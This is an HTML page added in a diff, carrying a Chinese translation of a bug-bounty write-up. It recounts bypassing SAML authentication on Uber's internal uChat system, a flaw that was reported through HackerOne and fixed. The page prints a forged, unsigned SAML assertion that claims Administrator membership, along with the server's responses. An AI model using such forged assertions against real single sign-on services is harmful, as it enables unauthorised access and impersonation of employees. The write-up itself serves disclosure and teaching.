@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>挖洞经验 | 看我如何利用SAML漏洞实现Uber内部聊天系统未授权登录</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>挖洞经验 | 看我如何利用SAML漏洞实现Uber内部聊天系统未授权登录</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651065198&amp;idx=4&amp;sn=722f10774d2623d289c5314c2665c5d4&amp;chksm=bd1f99e58a6810f33875defc4741f491b544a693f3d7e80cb242e00373c51ba04402db433b5e&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651065198&amp;idx=4&amp;sn=722f10774d2623d289c5314c2665c5d4&amp;chksm=bd1f99e58a6810f33875defc4741f491b544a693f3d7e80cb242e00373c51ba04402db433b5e&amp;scene=27#wechat_redirect</a></blockquote><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;"><strong><img data-src="http://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39JQ8rdGTMLWeHxFYnYdEalJUV9qBqhhibgiaXwTenKNjibHiase2e45G1cK4fzxq0Bpfalw0neHTaQzg/0?wx_fmt=jpeg" class="" data-ratio="0.5840579710144927" data-w="690" data-type="jpeg" src="../Images/7c7570958faf8418bbf859413ebcf576.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39JQ8rdGTMLWeHxFYnYdEalJUV9qBqhhibgiaXwTenKNjibHiase2e45G1cK4fzxq0Bpfalw0neHTaQzg/0?wx_fmt=jpeg"/></strong></p><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;"><span style="color: rgb(61, 167, 66);"><strong>本文讲述了利用SAML（安全声明标记语言）服务漏洞，绕过优步（Uber）公司内部聊天系统身份认证机制，实现了对该内部聊天系统的未授权登录访问，该漏洞最终获得Uber官方8500美元奖励。</strong></span></p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;white-space: normal;"><span style="font-size: 18px;">漏洞发现</span></h2><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;">通过Uber的漏洞赏金项目范围，我利用域名探索网站https://crt.sh，发现了其内部聊天系统https://uchat.uberinternal.com/login，该系统要求使用Uber内部员工的SSO凭据进行登录。</p><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: center;"><img data-src="http://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39JQ8rdGTMLWeHxFYnYdEalxdBk3SbbENqxiagPny9ywZ55ur99aw1yiaumHypKWH2K7gJE3dKpib9Wg/0?wx_fmt=jpeg" class="" data-ratio="0.4391304347826087" data-w="690" data-type="jpeg" src="../Images/43b5dd101c40699b7acee3e0fb96763e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39JQ8rdGTMLWeHxFYnYdEalxdBk3SbbENqxiagPny9ywZ55ur99aw1yiaumHypKWH2K7gJE3dKpib9Wg/0?wx_fmt=jpeg"/></p><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;">综合先前对Uber网络系统的研究，我猜测该系统的身份认证机制应该是基于SAML（安全声明标记语言）进行身份跨域传递和登录的，另外，我还发现了该系统使用SAML的服务端：</p><blockquote style="margin-right: 1em;margin-left: 1em;padding-right: 1em;padding-left: 1em;border-left-width: 4px;border-left-color: rgb(221, 221, 221);white-space: normal;quotes: none;"><p style="margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;">https://uchat.uberinternal.com/login/sso/saml</p><p style="margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;">SAML：安全声明标记语言（Security Assertion Markup Language），它是一个基于XML的标准，用于在不同安全域(security domain)之间交换认证和授权数据。SAML标准定义了身份提供者(identity provider)和服务提供者(service provider)，这两者构成了不同的安全域。为了保证身份安全，我们除了可以采用加密签名等措施，还可采用SAML规范来传输，传输的数据以XML形式为主，内容符合SAML的推荐标准。</p></blockquote><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;">为了发现该系统SAML框架的服务漏洞，我决定构造一个简单的SAML声明，通过POST请求方式把它发送到其服务端去。有关SAML单点登录（SSO）的基本机制，可点此了解查看。</p><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;">为了验证该聊天系统SAML服务是否部署了签名校验功能，我打算在POST请求中加入一个不带签名的简单XML标记，形成SAML请求一并发送至SAML服务端。该XML标记内容为：</p><pre style="margin: 1.2em 0em;font-size: 1em;font-family: Avenir, SimSun;line-height: 1.2em;"><code style="padding: 0.5em 0.7em;font-family: Avenir, SimSun;font-size: 0.9em;border-radius: 2px;overflow: auto;display: block !important;">&lt;samlp:Response xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="R0bdb6f33ef84425aa2782eab4483792762f297df" Version="2.0" IssueInstant="2016-05-04T01:37:34Z" Destination="" InResponseTo="ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c"&gt;
+&lt;samlp:Status&gt;
+&lt;samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/&gt;
+&lt;/samlp:Status&gt;
+&lt;saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Version="2.0" ID="pfxb75932c2-2e44-d18d-224b-354849a292af" IssueInstant="2016-05-04T01:37:34Z"&gt;
+&lt;saml:Subject&gt;
+&lt;saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"&gt;
+michael@test
+&lt;/saml:NameID&gt;
+&lt;saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"&gt;
+&lt;saml:SubjectConfirmationData NotOnOrAfter="2016-05-04T01:40:34Z" Recipient="" InResponseTo="ONELOGIN_bd24d63eafe235201b1bc636823c84381dbe575c"/&gt;
+&lt;/saml:SubjectConfirmation&gt;
+&lt;/saml:Subject&gt;
+&lt;saml:Conditions NotBefore="2016-05-04T01:34:34Z" NotOnOrAfter="2016-05-04T01:40:34Z"&gt;
+&lt;saml:AudienceRestriction&gt;
+&lt;saml:Audience&gt;
+php-saml
+&lt;/saml:Audience&gt;
+&lt;/saml:AudienceRestriction&gt;
+&lt;/saml:Conditions&gt;
+&lt;saml:AuthnStatement AuthnInstant="2016-05-04T01:37:33Z" SessionNotOnOrAfter="2016-05-05T01:37:34Z" SessionIndex="_b340ffa0-f3c6-0133-3483-02a5406d9a2f"&gt;
+&lt;saml:AuthnContext&gt;
+&lt;saml:AuthnContextClassRef&gt;
+urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
+&lt;/saml:AuthnContextClassRef&gt;
+&lt;/saml:AuthnContext&gt;
+&lt;/saml:AuthnStatement&gt;
+&lt;saml:AttributeStatement&gt;
+&lt;/saml:Attribute&gt; &lt;saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="Email"&gt;
+&lt;saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string"&gt;
+noreply@uber.com
+&lt;/saml:AttributeValue&gt;
+&lt;/saml:Attribute&gt;
+&lt;saml:Attribute NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic" Name="memberOf"&gt;
+&lt;saml:AttributeValue xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string"&gt;
+Administrator
+&lt;/saml:AttributeValue&gt;
+&lt;/saml:Attribute&gt;
+&lt;/saml:AttributeStatement&gt;
+&lt;/saml:Assertion&gt;
+&lt;/samlp:Response&gt;</code></pre><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;">当把以上这个SAML请求发送至聊天系统的SAML服务端后，该聊天系统远端服务器竟然给出了一个有效响应，它完全没对SAML请求的签名进行校验，其有效响应如下：</p><pre style="margin: 1.2em 0em;font-size: 1em;font-family: Avenir, SimSun;line-height: 1.2em;"><code style="padding: 0.5em 0.7em;font-family: Avenir, SimSun;font-size: 0.9em;border-radius: 2px;overflow: auto;display: block !important;">HTTP/1.1 302 Found
+Date: Sat, 22 Apr 2017 08:33:35 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 0
+Connection: keep-alive
+Server: nginx/1.11.5
+Set-Cookie: srv_id=; expires=Sun, 23-Apr-17 08:33:35 GMT; domain=uberinternal.com; path=/
+Content-Security-Policy: frame-ancestors ‘self’
+Location: /error?title=uchat+%28staging%29+needs+your+help%3A&amp;message=SAML+login+was+unsuccessful+because+one+of+the+attributes+is+incorrect.
++Please+contact+your+System+Administrator.&amp;details=Username+attribute+is+missing&amp;link=%2F&amp;linkmessage=Go+back+to+uChat
+X-Cluster-Id: X-Frame-Options:
+SAMEORIGIN X-Request-Id: uhg97nm9k3g19reb34gm8t6wjr
+X-Version-Id: 3.7.0.90.8fa8ba5e2ac11ee1f038953dfce9edd0.true
+HTTP/1.1 302 Found
+Date: Sat, 22 Apr 2017 08:33:35 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 0
+Connection: keep-alive
+Server: nginx/1.11.5
+Set-Cookie: srv_id=; expires=Sun, 23-Apr-17 08:33:35 GMT; domain=uberinternal.com; path=/
+Content-Security-Policy: frame-ancestors ‘self’
+Location: /error?title=uchat+%28staging%29+needs+your+help%3A&amp;message=SAML+login+was+unsuccessful+because+one+of+the+attributes+is+incorrect.
++Please+contact+your+System+Administrator.&amp;details=Username+attribute+is+missing&amp;link=%2F&amp;linkmessage=Go+back+to+uChat
+X-Cluster-Id: X-Frame-Options:
+SAMEORIGIN X-Request-Id: uhg97nm9k3g19reb34gm8t6wjr
+X-Version-Id: 3.7.0.90.8fa8ba5e2ac11ee1f038953dfce9edd0.true</code></pre><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;white-space: normal;"><span style="font-size: 18px;">漏洞利用</span></h2><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;">后来，我尝试在发送的SAML请求中加入用户名，经过测试，竟然不需任何Uber内部员工账户凭据，就可以成功登录进入该聊天系统。如此，这种方式能绕过聊天系统身份认证机制，以Uber有效员工身份，混入任何聊天频道，发起会话，或是在其中发布垃圾信息，或伪装身份发言等等。</p><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: center;"><img data-src="http://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39JQ8rdGTMLWeHxFYnYdEall6Sw9tq0c8xMvtmonfI3a5DPR83ahfzdvnEFrrVVoZnicPdh3icjibqdg/0?wx_fmt=jpeg" class="" data-ratio="0.5101449275362319" data-w="690" data-type="jpeg" src="../Images/7c4a975ade9ae75a3bac190e93db69ab.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39JQ8rdGTMLWeHxFYnYdEall6Sw9tq0c8xMvtmonfI3a5DPR83ahfzdvnEFrrVVoZnicPdh3icjibqdg/0?wx_fmt=jpeg"/></p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;white-space: normal;"><span style="font-size: 18px;">漏洞上报</span></h2><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;">之后，我迅速将该漏洞问题上报给了Uber安全团队，他们最终在身份认证机制中加入了SAML签名认证。</p><blockquote style="margin-right: 1em;margin-left: 1em;padding-right: 1em;padding-left: 1em;border-left-width: 4px;border-left-color: rgb(221, 221, 221);white-space: normal;quotes: none;"><p style="margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;">2017年4月22日 – 通过Hackerone进行漏洞初报</p><p style="margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;">2017年4月25日 – Uber反馈需要更多验证性证据</p><p style="margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;">2017年4月25日 – 向Uber发送了一段漏洞利用视频</p><p style="margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;">2017年4月29日 – 漏洞分类并获得前期500$奖励</p><p style="margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;">2017年5月1日 – 漏洞修复</p><p style="margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: justify !important;color: rgb(119, 117, 117) !important;">2017年5月1日 –再次获得Uber方面8000$奖励</p></blockquote><p style="white-space: normal;margin: 1em !important;font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;text-align: center;"><span style="color: rgb(178, 178, 178);">*参考来源：mish.re，freebuf小编clouds编译，转载请注明来自FreeBuf.COM</span></p><p><img data-s="300,640" data-type="jpeg" data-src="https://mmbiz.qpic.cn/mmbiz/qq5rfBadR3ic8CiaI3jDNE1pjxMWoM1hibUOrQypt6TwLx2iaicDUk4fCkEVKrkPJ5ia00nc363FCB6SW6Gian7F80ibMQ/0?wx_fmt=jpeg" class="" data-ratio="0.6466666666666666" data-w="600" src="../Images/402394fafbdaf09572b7ad2c881e910a.png" data-original-src="https://mmbiz.qpic.cn/mmbiz/qq5rfBadR3ic8CiaI3jDNE1pjxMWoM1hibUOrQypt6TwLx2iaicDUk4fCkEVKrkPJ5ia00nc363FCB6SW6Gian7F80ibMQ/0?wx_fmt=jpeg"/></p><p><br/></p>
+        
+</body>
+</html>
